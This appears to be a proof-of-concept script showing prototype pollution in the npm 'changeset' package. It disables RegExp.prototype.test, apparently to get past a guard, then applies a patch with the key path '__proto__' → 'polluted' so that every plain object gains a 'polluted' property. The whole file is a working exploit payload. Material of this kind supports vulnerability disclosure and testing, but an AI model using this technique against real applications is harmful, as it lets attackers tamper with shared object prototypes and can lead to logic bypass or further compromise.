RegExp.prototype.test = () => false;
console.log({}.polluted);
const changeset = require('changeset');
const patch = [{
        type: 'put',
        key: [
            '__proto__',
            'polluted'
        ],
        value: 'yes'
    }];
changeset.apply(patch, {}, true);
console.log({}.polluted);